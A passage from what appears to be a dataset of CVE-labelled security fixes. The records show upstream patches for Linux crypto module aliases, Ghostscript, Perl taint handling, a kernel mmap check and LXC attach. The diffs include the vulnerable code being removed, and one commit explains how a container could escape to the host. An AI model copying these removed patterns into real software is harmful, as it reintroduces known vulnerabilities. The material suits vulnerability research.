\n-MODULE_ALIAS(\"tgr160\");\n-MODULE_ALIAS(\"tgr128\");\n+MODULE_ALIAS_CRYPTO(\"tgr160\");\n+MODULE_ALIAS_CRYPTO(\"tgr128\");\n \n module_init(tgr192_mod_init);\n module_exit(tgr192_mod_fini);\ndiff --git a\/crypto\/twofish_generic.c b\/crypto\/twofish_generic.c\nindex 2d5000552d0f9..523ad8c4e3591 100644\n--- a\/crypto\/twofish_generic.c\n+++ b\/crypto\/twofish_generic.c\n@@ -211,4 +211,4 @@ module_exit(twofish_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION (\"Twofish Cipher Algorithm\");\n-MODULE_ALIAS(\"twofish\");\n+MODULE_ALIAS_CRYPTO(\"twofish\");\ndiff --git a\/crypto\/wp512.c b\/crypto\/wp512.c\nindex ec64e7762fbb5..0de42eb3d0400 100644\n--- a\/crypto\/wp512.c\n+++ b\/crypto\/wp512.c\n@@ -1167,8 +1167,8 @@ static void __exit wp512_mod_fini(void)\n \tcrypto_unregister_shashes(wp_algs, ARRAY_SIZE(wp_algs));\n }\n \n-MODULE_ALIAS(\"wp384\");\n-MODULE_ALIAS(\"wp256\");\n+MODULE_ALIAS_CRYPTO(\"wp384\");\n+MODULE_ALIAS_CRYPTO(\"wp256\");\n \n module_init(wp512_mod_init);\n module_exit(wp512_mod_fini);\ndiff --git a\/crypto\/zlib.c b\/crypto\/zlib.c\nindex c9ee681d57fdf..0eefa9d237ace 100644\n--- a\/crypto\/zlib.c\n+++ b\/crypto\/zlib.c\n@@ -378,3 +378,4 @@ module_exit(zlib_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Zlib Compression Algorithm\");\n MODULE_AUTHOR(\"Sony Corporation\");\n+MODULE_ALIAS_CRYPTO(\"zlib\");\ndiff --git a\/drivers\/crypto\/padlock-aes.c b\/drivers\/crypto\/padlock-aes.c\nindex 633ba945e153d..c178ed8c3908d 100644\n--- a\/drivers\/crypto\/padlock-aes.c\n+++ b\/drivers\/crypto\/padlock-aes.c\n@@ -563,4 +563,4 @@ MODULE_DESCRIPTION(\"VIA PadLock AES algorithm support\");\n MODULE_LICENSE(\"GPL\");\n MODULE_AUTHOR(\"Michal Ludvig\");\n \n-MODULE_ALIAS(\"aes\");\n+MODULE_ALIAS_CRYPTO(\"aes\");\ndiff --git a\/drivers\/crypto\/padlock-sha.c b\/drivers\/crypto\/padlock-sha.c\nindex bace885634f24..95f7d27ce491f 100644\n--- a\/drivers\/crypto\/padlock-sha.c\n+++ b\/drivers\/crypto\/padlock-sha.c\n@@ -593,7 +593,7 @@ MODULE_DESCRIPTION(\"VIA PadLock SHA1\/SHA256 algorithms support.\");\n MODULE_LICENSE(\"GPL\");\n MODULE_AUTHOR(\"Michal Ludvig\");\n \n-MODULE_ALIAS(\"sha1-all\");\n-MODULE_ALIAS(\"sha256-all\");\n-MODULE_ALIAS(\"sha1-padlock\");\n-MODULE_ALIAS(\"sha256-padlock\");\n+MODULE_ALIAS_CRYPTO(\"sha1-all\");\n+MODULE_ALIAS_CRYPTO(\"sha256-all\");\n+MODULE_ALIAS_CRYPTO(\"sha1-padlock\");\n+MODULE_ALIAS_CRYPTO(\"sha256-padlock\");\ndiff --git a\/drivers\/crypto\/qat\/qat_common\/adf_ctl_drv.c b\/drivers\/crypto\/qat\/qat_common\/adf_ctl_drv.c\nindex 244d73378f0e0..7ee93f881db69 100644\n--- a\/drivers\/crypto\/qat\/qat_common\/adf_ctl_drv.c\n+++ b\/drivers\/crypto\/qat\/qat_common\/adf_ctl_drv.c\n@@ -52,6 +52,7 @@\n #include <linux\/pci.h>\n #include <linux\/cdev.h>\n #include <linux\/uaccess.h>\n+#include <linux\/crypto.h>\n \n #include \"adf_accel_devices.h\"\n #include \"adf_common_drv.h\"\n@@ -487,4 +488,4 @@ module_exit(adf_unregister_ctl_device_driver);\n MODULE_LICENSE(\"Dual BSD\/GPL\");\n MODULE_AUTHOR(\"Intel\");\n MODULE_DESCRIPTION(\"Intel(R) QuickAssist Technology\");\n-MODULE_ALIAS(\"intel_qat\");\n+MODULE_ALIAS_CRYPTO(\"intel_qat\");\ndiff --git a\/drivers\/crypto\/ux500\/cryp\/cryp_core.c b\/drivers\/crypto\/ux500\/cryp\/cryp_core.c\nindex 83811aab207e5..7c035de9055e5 100644\n--- a\/drivers\/crypto\/ux500\/cryp\/cryp_core.c\n+++ b\/drivers\/crypto\/ux500\/cryp\/cryp_core.c\n@@ -1812,7 +1812,7 @@ module_exit(ux500_cryp_mod_fini);\n module_param(cryp_mode, int, 0);\n \n MODULE_DESCRIPTION(\"Driver for ST-Ericsson UX500 CRYP crypto engine.\");\n-MODULE_ALIAS(\"aes-all\");\n-MODULE_ALIAS(\"des-all\");\n+MODULE_ALIAS_CRYPTO(\"aes-all\");\n+MODULE_ALIAS_CRYPTO(\"des-all\");\n \n MODULE_LICENSE(\"GPL\");\ndiff --git a\/drivers\/crypto\/ux500\/hash\/hash_core.c b\/drivers\/crypto\/ux500\/hash\/hash_core.c\nindex 5af53b5508b0d..76ecc8d143d0f 100644\n--- a\/drivers\/crypto\/ux500\/hash\/hash_core.c\n+++ b\/drivers\/crypto\/ux500\/hash\/hash_core.c\n@@ -1997,7 +1997,7 @@ module_exit(ux500_hash_mod_fini);\n MODULE_DESCRIPTION(\"Driver for ST-Ericsson UX500 HASH engine.\");\n MODULE_LICENSE(\"GPL\");\n \n-MODULE_ALIAS(\"sha1-all\");\n-MODULE_ALIAS(\"sha256-all\");\n-MODULE_ALIAS(\"hmac-sha1-all\");\n-MODULE_ALIAS(\"hmac-sha256-all\");\n+MODULE_ALIAS_CRYPTO(\"sha1-all\");\n+MODULE_ALIAS_CRYPTO(\"sha256-all\");\n+MODULE_ALIAS_CRYPTO(\"hmac-sha1-all\");\n+MODULE_ALIAS_CRYPTO(\"hmac-sha256-all\");\ndiff --git a\/drivers\/s390\/crypto\/ap_bus.c b\/drivers\/s390\/crypto\/ap_bus.c\nindex 99485415dcc25..91e97ec014189 100644\n--- a\/drivers\/s390\/crypto\/ap_bus.c\n+++ b\/drivers\/s390\/crypto\/ap_bus.c\n@@ -44,6 +44,7 @@\n #include <linux\/hrtimer.h>\n #include <linux\/ktime.h>\n #include <asm\/facility.h>\n+#include <linux\/crypto.h>\n \n #include \"ap_bus.h\"\n \n@@ -71,7 +72,7 @@ MODULE_AUTHOR(\"IBM Corporation\");\n MODULE_DESCRIPTION(\"Adjunct Processor Bus driver, \" \\\n \t\t   \"Copyright IBM Corp. 2006, 2012\");\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"z90crypt\");\n+MODULE_ALIAS_CRYPTO(\"z90crypt\");\n \n \/*\n  * Module parameter\ndiff --git a\/include\/linux\/crypto.h b\/include\/linux\/crypto.h\nindex 208a63290b231..9c8776d0ada87 100644\n--- a\/include\/linux\/crypto.h\n+++ b\/include\/linux\/crypto.h\n@@ -25,6 +25,19 @@\n #include <linux\/string.h>\n #include <linux\/uaccess.h>\n \n+\/*\n+ * Autoloaded crypto modules should only use a prefixed name to avoid allowing\n+ * arbitrary modules to be loaded. Loading from userspace may still need the\n+ * unprefixed names, so retains those aliases as well.\n+ * This uses __MODULE_INFO directly instead of MODULE_ALIAS because pre-4.3\n+ * gcc (e.g. avr32 toolchain) uses __LINE__ for uniqueness, and this macro\n+ * expands twice on the same line. Instead, use a separate base name for the\n+ * alias.\n+ *\/\n+#define MODULE_ALIAS_CRYPTO(name)\t\\\n+\t\t__MODULE_INFO(alias, alias_userspace, name);\t\\\n+\t\t__MODULE_INFO(alias, alias_crypto, \"crypto-\" name)\n+\n \/*\n  * Algorithm masks and types.\n  *\/\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2018-16802","CWE_ID":"264","category":"security","commit_id":"3e5d316b72e3965b7968bb1d96baa137cd063ac6","commit_message":"From 3e5d316b72e3965b7968bb1d96baa137cd063ac6 Mon Sep 17 00:00:00 2001\nFrom: Chris Liddell <chris.liddell@artifex.com>\nDate: Wed, 5 Sep 2018 17:14:59 +0100\nSubject: [PATCH] Bug 699718: Ensure stack space is available before gsrestore\n call out\n\nDuring a grestore, if the device is going to change, we call out to Postscript\nto restore the device configuration, before returning to restore the graphics\nstate internally.\n\nWe have to ensure sufficient op stack space is available to complete the\noperation, otherwise the device can end up an undefined state.\n---\n Resource\/Init\/gs_setpd.ps | 20 +++++++++++------\n psi\/zdevice2.c            | 55 ++++++++++++++++++++++++++++++++++++-----------\n 2 files changed, 56 insertions(+), 19 deletions(-)\n\n","diff_code":"diff --git a\/Resource\/Init\/gs_setpd.ps b\/Resource\/Init\/gs_setpd.ps\nindex b75c431..8fa7c51 100644\n--- a\/Resource\/Init\/gs_setpd.ps\n+++ b\/Resource\/Init\/gs_setpd.ps\n@@ -96,7 +96,7 @@ level2dict begin\n         % we must (carefully) reinstall the old parameters in\n         % the same device.\n    .currentpagedevice pop \/\/null currentdevice \/\/null\n-   {.trysetparams} .internalstopped\n+   { .trysetparams } .internalstopped\n    {\n      \/\/null\n    } if\n@@ -104,26 +104,32 @@ level2dict begin\n     { pop pop }\n     {\n       SETPDDEBUG { (Error in .trysetparams!) = pstack flush } if\n-      cleartomark pop pop pop\n+      {cleartomark pop pop pop} .internalstopped pop\n       % if resetting the entire device state failed, at least put back the\n       % security related key\n-      currentdevice \/\/null \/\/false mark \/.LockSafetyParams .currentpagedevice pop\n-      \/.LockSafetyParams .knownget not {\/\/false} if .putdeviceparamsonly\n+      currentdevice \/\/null \/\/false mark \/.LockSafetyParams\n+      currentpagedevice \/.LockSafetyParams .knownget not\n+      {systemdict \/SAFER .knownget not {\/\/false} } if\n+      .putdeviceparamsonly\n       \/.installpagedevice cvx \/rangecheck signalerror\n     }\n    ifelse pop pop\n         % A careful reading of the Red Book reveals that an erasepage\n         % should occur, but *not* an initgraphics.\n    erasepage .beginpage\n- } bind def\n+ } bind executeonly def\n \n \/.uninstallpagedevice\n- { 2 .endpage { .currentnumcopies \/\/false .outputpage } if\n+ {\n+   {2 .endpage { .currentnumcopies \/\/false .outputpage } if} .internalstopped pop\n    nulldevice\n  } bind def\n \n (%grestorepagedevice) cvn\n- { .uninstallpagedevice grestore .installpagedevice\n+ {\n+ .uninstallpagedevice\n+ grestore\n+ .installpagedevice\n  } bind def\n \n (%grestoreallpagedevice) cvn\ndiff --git a\/psi\/zdevice2.c b\/psi\/zdevice2.c\nindex 0c7080d..5447c8c 100644\n--- a\/psi\/zdevice2.c\n+++ b\/psi\/zdevice2.c\n@@ -251,8 +251,8 @@ z2currentgstate(i_ctx_t *i_ctx_p)\n \/* ------ Wrappers for operators that reset the graphics state. ------ *\/\n \n \/* Check whether we need to call out to restore the page device. *\/\n-static bool\n-restore_page_device(const gs_gstate * pgs_old, const gs_gstate * pgs_new)\n+static int\n+restore_page_device(i_ctx_t *i_ctx_p, const gs_gstate * pgs_old, const gs_gstate * pgs_new)\n {\n     gx_device *dev_old = gs_currentdevice(pgs_old);\n     gx_device *dev_new;\n@@ -260,9 +260,10 @@ restore_page_device(const gs_gstate * pgs_old, const gs_gstate * pgs_new)\n     gx_device *dev_t2;\n     bool samepagedevice = obj_eq(dev_old->memory, &gs_int_gstate(pgs_old)->pagedevice,\n         &gs_int_gstate(pgs_new)->pagedevice);\n+    bool LockSafetyParams = dev_old->LockSafetyParams;\n \n     if ((dev_t1 = (*dev_proc(dev_old, get_page_device)) (dev_old)) == 0)\n-        return false;\n+        return 0;\n     \/* If we are going to putdeviceparams in a callout, we need to *\/\n     \/* unlock temporarily.  The device will be re-locked as needed *\/\n     \/* by putdeviceparams from the pgs_old->pagedevice dict state. *\/\n@@ -271,23 +272,44 @@ restore_page_device(const gs_gstate * pgs_old, const gs_gstate * pgs_new)\n     dev_new = gs_currentdevice(pgs_new);\n     if (dev_old != dev_new) {\n         if ((dev_t2 = (*dev_proc(dev_new, get_page_device)) (dev_new)) == 0)\n-            return false;\n-        if (dev_t1 != dev_t2)\n-            return true;\n+            samepagedevice = true;\n+        else if (dev_t1 != dev_t2)\n+            samepagedevice = false;\n+    }\n+\n+    if (LockSafetyParams && !samepagedevice) {\n+        os_ptr op = osp;\n+        const int max_ops = 512;\n+\n+        \/* The %grestorepagedevice must complete: the biggest danger\n+           is operand stack overflow. As we use get\/putdeviceparams\n+           that means pushing all the device params onto the stack,\n+           pdfwrite having by far the largest number of parameters\n+           at (currently) 212 key\/value pairs - thus needing (currently)\n+           424 entries on the op stack. Allowing for working stack\n+           space, and safety margin.....\n+         *\/\n+        if (max_ops > op - osbot) {\n+            if (max_ops >= ref_stack_count(&o_stack))\n+               return_error(gs_error_stackoverflow);\n+        }\n     }\n     \/*\n      * The current implementation of setpagedevice just sets new\n      * parameters in the same device object, so we have to check\n      * whether the page device dictionaries are the same.\n      *\/\n-    return !samepagedevice;\n+    return samepagedevice ? 0 : 1;\n }\n \n \/* - grestore - *\/\n static int\n z2grestore(i_ctx_t *i_ctx_p)\n {\n-    if (!restore_page_device(igs, gs_gstate_saved(igs)))\n+    int code = restore_page_device(i_ctx_p, igs, gs_gstate_saved(igs));\n+    if (code < 0) return code;\n+\n+    if (code == 0)\n         return gs_grestore(igs);\n     return push_callout(i_ctx_p, \"%grestorepagedevice\");\n }\n@@ -297,7 +319,9 @@ static int\n z2grestoreall(i_ctx_t *i_ctx_p)\n {\n     for (;;) {\n-        if (!restore_page_device(igs, gs_gstate_saved(igs))) {\n+        int code = restore_page_device(i_ctx_p, igs, gs_gstate_saved(igs));\n+        if (code < 0) return code;\n+        if (code == 0) {\n             bool done = !gs_gstate_saved(gs_gstate_saved(igs));\n \n             gs_grestore(igs);\n@@ -328,11 +352,15 @@ z2restore(i_ctx_t *i_ctx_p)\n     if (code < 0) return code;\n \n     while (gs_gstate_saved(gs_gstate_saved(igs))) {\n-        if (restore_page_device(igs, gs_gstate_saved(igs)))\n+        code = restore_page_device(i_ctx_p, igs, gs_gstate_saved(igs));\n+        if (code < 0) return code;\n+        if (code > 0)\n             return push_callout(i_ctx_p, \"%restore1pagedevice\");\n         gs_grestore(igs);\n     }\n-    if (restore_page_device(igs, gs_gstate_saved(igs)))\n+    code = restore_page_device(i_ctx_p, igs, gs_gstate_saved(igs));\n+    if (code < 0) return code;\n+    if (code > 0)\n         return push_callout(i_ctx_p, \"%restorepagedevice\");\n \n     code = dorestore(i_ctx_p, asave);\n@@ -355,9 +383,12 @@ static int\n z2setgstate(i_ctx_t *i_ctx_p)\n {\n     os_ptr op = osp;\n+    int code;\n \n     check_stype(*op, st_igstate_obj);\n-    if (!restore_page_device(igs, igstate_ptr(op)))\n+    code = restore_page_device(i_ctx_p, igs, igstate_ptr(op));\n+    if (code < 0) return code;\n+    if (code == 0)\n         return zsetgstate(i_ctx_p);\n     return push_callout(i_ctx_p, \"%setgstatepagedevice\");\n }\n-- \n2.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-1487","CWE_ID":"264","category":"security","commit_id":"539689e74a3bcb04d29e4cd9396de91a81045b99","commit_message":"From 539689e74a3bcb04d29e4cd9396de91a81045b99 Mon Sep 17 00:00:00 2001\nFrom: Father Chrysostomos <sprout@cpan.org>\nDate: Thu, 31 Mar 2011 06:28:49 -0700\nSubject: [PATCH] [perl #87336] lc\/uc(first) fail to taint the returned string\n\nThis bug was caused by change 28011 (ec9af7d), which stopped pp_lc\nfrom using sv_setsv_flags, thereby bypassing these two lines at the\nend of that function:\n    if (SvTAINTED(sstr))\n\tSvTAINT(dstr);\n\nChange 28012 (6730619) did exactly the same thing to pp_uc.\n\n28013 (d54190f) broke ucfirst and lcfirst.\n\nThis commit simply puts that taint logic at the end of the pp_*\nfunctions.\n---\n pp.c         |  6 ++++++\n t\/op\/taint.t | 15 ++++++++++++++-\n 2 files changed, 20 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/pp.c b\/pp.c\nindex 751a0bf79e..8b15b6ec5f 100644\n--- a\/pp.c\n+++ b\/pp.c\n@@ -4209,6 +4209,8 @@ PP(pp_ucfirst)\n \t    SvCUR_set(dest, need - 1);\n \t}\n     }\n+    if (dest != source && SvTAINTED(source))\n+\tSvTAINT(dest);\n     SvSETMAGIC(dest);\n     RETURN;\n }\n@@ -4479,6 +4481,8 @@ PP(pp_uc)\n \t    SvCUR_set(dest, d - (U8*)SvPVX_const(dest));\n \t}\n     } \/* End of isn't utf8 *\/\n+    if (dest != source && SvTAINTED(source))\n+\tSvTAINT(dest);\n     SvSETMAGIC(dest);\n     RETURN;\n }\n@@ -4701,6 +4705,8 @@ PP(pp_lc)\n \t    SvCUR_set(dest, d - (U8*)SvPVX_const(dest));\n \t}\n     }\n+    if (dest != source && SvTAINTED(source))\n+\tSvTAINT(dest);\n     SvSETMAGIC(dest);\n     RETURN;\n }\ndiff --git a\/t\/op\/taint.t b\/t\/op\/taint.t\nindex c695570bfe..9df6fee35c 100644\n--- a\/t\/op\/taint.t\n+++ b\/t\/op\/taint.t\n@@ -17,7 +17,7 @@ BEGIN {\n use strict;\n use Config;\n \n-plan tests => 770;\n+plan tests => 774;\n \n $| = 1;\n \n@@ -2131,6 +2131,19 @@ end\n \t    \"user-defined property: tainted case\");\n }\n \n+{\n+    # [perl #87336] lc\/uc(first) failing to taint the returned string\n+    my $source = \"foo$TAINT\";\n+    my $dest = lc $source;\n+    is_tainted $dest, \"lc(tainted) taints its return value\";\n+    $dest = lcfirst $source;\n+    is_tainted $dest, \"lcfirst(tainted) taints its return value\";\n+    $dest = uc $source;\n+    is_tainted $dest, \"uc(tainted) taints its return value\";\n+    $dest = ucfirst $source;\n+    is_tainted $dest, \"ucfirst(tainted) taints its return value\";\n+}\n+\n # This may bomb out with the alarm signal so keep it last\n SKIP: {\n     skip \"No alarm()\"  unless $Config{d_alarm};\n-- \n2.15.1-424-g9478a660812\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"aa65607373a4daf2010e8c3867b6317619f3c1a3","commit_message":"From aa65607373a4daf2010e8c3867b6317619f3c1a3 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Fri, 11 Dec 2009 06:48:57 -0500\nSubject: Add missing alignment check in arch\/score sys_mmap()\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch\/score\/kernel\/sys_score.c | 7 ++++---\n 1 file changed, 4 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/arch\/score\/kernel\/sys_score.c b\/arch\/score\/kernel\/sys_score.c\nindex 3d6a67dd628c..856ed68a58e6 100644\n--- a\/arch\/score\/kernel\/sys_score.c\n+++ b\/arch\/score\/kernel\/sys_score.c\n@@ -41,10 +41,11 @@ sys_mmap2(unsigned long addr, unsigned long len, unsigned long prot,\n \n asmlinkage long\n sys_mmap(unsigned long addr, unsigned long len, unsigned long prot,\n-\tunsigned long flags, unsigned long fd, off_t pgoff)\n+\tunsigned long flags, unsigned long fd, off_t offset)\n {\n-\t\/* where's the alignment check? *\/\n-\treturn sys_mmap_pgoff(addr, len, prot, flags, fd, pgoff >> PAGE_SHIFT);\n+\tif (unlikely(offset & ~PAGE_MASK))\n+\t\treturn -EINVAL;\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd, offset >> PAGE_SHIFT);\n }\n \n asmlinkage long\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2016-8649","CWE_ID":"264","category":"security","commit_id":"81f466d05f2a89cb4f122ef7f593ff3f279b165c","commit_message":"From 81f466d05f2a89cb4f122ef7f593ff3f279b165c Mon Sep 17 00:00:00 2001\nFrom: Christian Brauner <christian.brauner@canonical.com>\nDate: Tue, 8 Nov 2016 19:21:19 +0100\nSubject: [PATCH] attach: do not send procfd to attached process\n\nSo far, we opened a file descriptor refering to proc on the host inside the\nhost namespace and handed that fd to the attached process in\nattach_child_main(). This was done to ensure that LSM labels were correctly\nsetup. However, by exploiting a potential kernel bug, ptrace could be used to\nprevent the file descriptor from being closed which in turn could be used by an\nunprivileged container to gain access to the host namespace. Aside from this\nneeding an upstream kernel fix, we should make sure that we don't pass the fd\nfor proc itself to the attached process. However, we cannot completely prevent\nthis, as the attached process needs to be able to change its apparmor profile\nby writing to \/proc\/self\/attr\/exec or \/proc\/self\/attr\/current. To minimize the\nattack surface, we only send the fd for \/proc\/self\/attr\/exec or\n\/proc\/self\/attr\/current to the attached process. To do this we introduce a\nlittle more IPC between the child and parent:\n\n\t * IPC mechanism: (X is receiver)\n\t *   initial process        intermediate          attached\n\t *        X           <---  send pid of\n\t *                          attached proc,\n\t *                          then exit\n\t *    send 0 ------------------------------------>    X\n\t *                                              [do initialization]\n\t *        X  <------------------------------------  send 1\n\t *   [add to cgroup, ...]\n\t *    send 2 ------------------------------------>    X\n\t *\t\t\t\t\t\t[set LXC_ATTACH_NO_NEW_PRIVS]\n\t *        X  <------------------------------------  send 3\n\t *   [open LSM label fd]\n\t *    send 4 ------------------------------------>    X\n\t *   \t\t\t\t\t\t[set LSM label]\n\t *   close socket                                 close socket\n\t *                                                run program\n\nThe attached child tells the parent when it is ready to have its LSM labels set\nup. The parent then opens an approriate fd for the child PID to\n\/proc\/<pid>\/attr\/exec or \/proc\/<pid>\/attr\/current and sends it via SCM_RIGHTS\nto the child. The child can then set its LSM laben. Both sides then close the\nsocket fds and the child execs the requested process.\n\nSigned-off-by: Christian Brauner <christian.brauner@canonical.com>\n---\n src\/lxc\/attach.c | 184 ++++++++++++++++++++++++++++++++++-------------\n 1 file changed, 134 insertions(+), 50 deletions(-)\n\n","diff_code":"diff --git a\/src\/lxc\/attach.c b\/src\/lxc\/attach.c\nindex bfb2abf014..2f095b408f 100644\n--- a\/src\/lxc\/attach.c\n+++ b\/src\/lxc\/attach.c\n@@ -53,6 +53,7 @@\n \n #include \"namespace.h\"\n #include \"log.h\"\n+#include \"af_unix.h\"\n #include \"attach.h\"\n #include \"caps.h\"\n #include \"config.h\"\n@@ -84,80 +85,103 @@\n \n lxc_log_define(lxc_attach, lxc);\n \n-int lsm_set_label_at(int procfd, int on_exec, char* lsm_label) {\n+static int lsm_openat(int procfd, pid_t pid, int on_exec)\n+{\n+\tint ret = -1;\n \tint labelfd = -1;\n-\tint ret = 0;\n \tconst char* name;\n-\tchar* command = NULL;\n+#define __LSMATTRLEN \/* \/proc *\/ (5 + \/* \/pid-to-str *\/ 21 + \/* \/current *\/ 7 + \/* \\0 *\/ 1)\n+\tchar path[__LSMATTRLEN];\n \n \tname = lsm_name();\n \n \tif (strcmp(name, \"nop\") == 0)\n-\t\tgoto out;\n+\t\treturn 0;\n \n \tif (strcmp(name, \"none\") == 0)\n-\t\tgoto out;\n+\t\treturn 0;\n \n \t\/* We don't support on-exec with AppArmor *\/\n \tif (strcmp(name, \"AppArmor\") == 0)\n \t\ton_exec = 0;\n \n \tif (on_exec) {\n-\t\tlabelfd = openat(procfd, \"self\/attr\/exec\", O_RDWR);\n-\t}\n-\telse {\n-\t\tlabelfd = openat(procfd, \"self\/attr\/current\", O_RDWR);\n+\t\tret = snprintf(path, __LSMATTRLEN, \"%d\/attr\/exec\", pid);\n+\t\tif (ret < 0 || ret >= __LSMATTRLEN)\n+\t\t\treturn -1;\n+\t\tlabelfd = openat(procfd, path, O_RDWR);\n+\t} else {\n+\t\tret = snprintf(path, __LSMATTRLEN, \"%d\/attr\/current\", pid);\n+\t\tif (ret < 0 || ret >= __LSMATTRLEN)\n+\t\t\treturn -1;\n+\t\tlabelfd = openat(procfd, path, O_RDWR);\n \t}\n \n \tif (labelfd < 0) {\n \t\tSYSERROR(\"Unable to open LSM label\");\n-\t\tret = -1;\n-\t\tgoto out;\n+\t\treturn -1;\n \t}\n \n+\treturn labelfd;\n+}\n+\n+static int lsm_set_label_at(int lsm_labelfd, int on_exec, char *lsm_label)\n+{\n+\tint fret = -1;\n+\tconst char* name;\n+\tchar *command = NULL;\n+\n+\tname = lsm_name();\n+\n+\tif (strcmp(name, \"nop\") == 0)\n+\t\treturn 0;\n+\n+\tif (strcmp(name, \"none\") == 0)\n+\t\treturn 0;\n+\n+\t\/* We don't support on-exec with AppArmor *\/\n+\tif (strcmp(name, \"AppArmor\") == 0)\n+\t\ton_exec = 0;\n+\n \tif (strcmp(name, \"AppArmor\") == 0) {\n \t\tint size;\n \n \t\tcommand = malloc(strlen(lsm_label) + strlen(\"changeprofile \") + 1);\n \t\tif (!command) {\n \t\t\tSYSERROR(\"Failed to write apparmor profile\");\n-\t\t\tret = -1;\n \t\t\tgoto out;\n \t\t}\n \n \t\tsize = sprintf(command, \"changeprofile %s\", lsm_label);\n \t\tif (size < 0) {\n \t\t\tSYSERROR(\"Failed to write apparmor profile\");\n-\t\t\tret = -1;\n \t\t\tgoto out;\n \t\t}\n \n-\t\tif (write(labelfd, command, size + 1) < 0) {\n-\t\t\tSYSERROR(\"Unable to set LSM label\");\n-\t\t\tret = -1;\n+\t\tif (write(lsm_labelfd, command, size + 1) < 0) {\n+\t\t\tSYSERROR(\"Unable to set LSM label: %s.\", command);\n \t\t\tgoto out;\n \t\t}\n-\t}\n-\telse if (strcmp(name, \"SELinux\") == 0) {\n-\t\tif (write(labelfd, lsm_label, strlen(lsm_label) + 1) < 0) {\n+\t\tINFO(\"Set LSM label to: %s.\", command);\n+\t} else if (strcmp(name, \"SELinux\") == 0) {\n+\t\tif (write(lsm_labelfd, lsm_label, strlen(lsm_label) + 1) < 0) {\n \t\t\tSYSERROR(\"Unable to set LSM label\");\n-\t\t\tret = -1;\n \t\t\tgoto out;\n \t\t}\n-\t}\n-\telse {\n+\t\tINFO(\"Set LSM label to: %s.\", lsm_label);\n+\t} else {\n \t\tERROR(\"Unable to restore label for unknown LSM: %s\", name);\n-\t\tret = -1;\n \t\tgoto out;\n \t}\n+\tfret = 0;\n \n out:\n \tfree(command);\n \n-\tif (labelfd != -1)\n-\t\tclose(labelfd);\n+\tif (lsm_labelfd != -1)\n+\t\tclose(lsm_labelfd);\n \n-\treturn ret;\n+\treturn fret;\n }\n \n static struct lxc_proc_context_info *lxc_proc_get_context_info(pid_t pid)\n@@ -646,7 +670,6 @@ struct attach_clone_payload {\n \tstruct lxc_proc_context_info* init_ctx;\n \tlxc_attach_exec_t exec_function;\n \tvoid* exec_payload;\n-\tint procfd;\n };\n \n static int attach_child_main(void* data);\n@@ -744,7 +767,6 @@ int lxc_attach(const char* name, const char* lxcpath, lxc_attach_exec_t exec_fun\n \tchar* cwd;\n \tchar* new_cwd;\n \tint ipc_sockets[2];\n-\tint procfd;\n \tsigned long personality;\n \n \tif (!options)\n@@ -821,6 +843,11 @@ int lxc_attach(const char* name, const char* lxcpath, lxc_attach_exec_t exec_fun\n \t *        X  <------------------------------------  send 1\n \t *   [add to cgroup, ...]\n \t *    send 2 ------------------------------------>    X\n+\t *\t\t\t\t\t\t[set LXC_ATTACH_NO_NEW_PRIVS]\n+\t *        X  <------------------------------------  send 3\n+\t *   [open LSM label fd]\n+\t *    send 4 ------------------------------------>    X\n+\t *   \t\t\t\t\t\t[set LSM label]\n \t *   close socket                                 close socket\n \t *                                                run program\n \t *\/\n@@ -854,6 +881,7 @@ int lxc_attach(const char* name, const char* lxcpath, lxc_attach_exec_t exec_fun\n \t}\n \n \tif (pid) {\n+\t\tint procfd = -1;\n \t\tpid_t to_cleanup_pid = pid;\n \n \t\t\/* initial thread, we close the socket that is for the\n@@ -868,6 +896,15 @@ int lxc_attach(const char* name, const char* lxcpath, lxc_attach_exec_t exec_fun\n \t\t\t\tgoto cleanup_error;\n \t\t}\n \n+\t\t\/* Open \/proc before setns() to the containers namespace so we\n+\t\t * don't rely on any information from inside the container.\n+\t\t *\/\n+\t\tprocfd = open(\"\/proc\", O_DIRECTORY | O_RDONLY | O_CLOEXEC);\n+\t\tif (procfd < 0) {\n+\t\t\tSYSERROR(\"Unable to open \/proc.\");\n+\t\t\tgoto cleanup_error;\n+\t\t}\n+\n \t\t\/* Let the child process know to go ahead *\/\n \t\tstatus = 0;\n \t\tret = lxc_write_nointr(ipc_sockets[0], &status, sizeof(status));\n@@ -911,7 +948,8 @@ int lxc_attach(const char* name, const char* lxcpath, lxc_attach_exec_t exec_fun\n \t\tret = lxc_read_nointr_expect(ipc_sockets[0], &status, sizeof(status), &expected);\n \t\tif (ret <= 0) {\n \t\t\tif (ret != 0)\n-\t\t\t\tERROR(\"error using IPC to receive notification from attached process (1)\");\n+\t\t\t\tERROR(\"error using IPC to receive notification \"\n+\t\t\t\t      \"from attached process (1)\");\n \t\t\tgoto cleanup_error;\n \t\t}\n \n@@ -919,10 +957,40 @@ int lxc_attach(const char* name, const char* lxcpath, lxc_attach_exec_t exec_fun\n \t\tstatus = 2;\n \t\tret = lxc_write_nointr(ipc_sockets[0], &status, sizeof(status));\n \t\tif (ret <= 0) {\n-\t\t\tERROR(\"error using IPC to notify attached process for initialization (2)\");\n+\t\t\tERROR(\"Error using IPC to notify attached process for \"\n+\t\t\t      \"initialization (2): %s.\", strerror(errno));\n \t\t\tgoto cleanup_error;\n \t\t}\n \n+\t\t\/* Wait for the (grand)child to tell us that it's ready to set\n+\t\t * up its LSM labels.\n+\t\t *\/\n+\t\texpected = 3;\n+\t\tret = lxc_read_nointr_expect(ipc_sockets[0], &status, sizeof(status), &expected);\n+\t\tif (ret <= 0) {\n+\t\t\tERROR(\"Error using IPC for the child to tell us to open LSM fd (3): %s.\",\n+\t\t\t      strerror(errno));\n+\t\t\tgoto cleanup_error;\n+\t\t}\n+\n+\t\t\/* Open LSM fd and send it 